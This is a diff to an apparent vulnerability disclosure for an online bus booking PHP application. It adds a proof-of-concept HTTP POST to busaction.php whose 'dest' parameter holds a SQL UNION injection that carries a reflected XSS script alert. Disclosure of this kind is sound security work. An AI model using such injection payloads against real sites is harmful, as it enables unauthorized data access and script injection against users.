@@ -277,6 +277,34 @@ Reflected XSS (or Non-Persistent) - The server reads data directly from the HTTP
 
 ![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/34726338-7aa2-4afc-bf6f-259095f5836a)
 
+POC:
+
+```
+POST /busaction.php HTTP/1.1
+Host: onlinebus
+Content-Length: 140
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://onlinebus
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://onlinebus/bookbus.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=jmetab2u149tgvq0m6nh6mbeh9
+Connection: close
+
+source=Dadoji+Kondadev+Stadium&dest=Court+Naka'UNION ALL SELECT NULL,'<script>alert(123)</script>',NULL,NULL,NULL-- -&number=2&login_submit=
+```
+
+![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/444a0881-9ee1-4e8a-9673-b5eb656cb267)
+
+
+![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/88335da9-39be-4bfc-8bc7-e941e9109661)
+
+
+
 # 6. myprofile.php Cross-site Scripting (XSS)
 
 in myprofile.php show the info of me
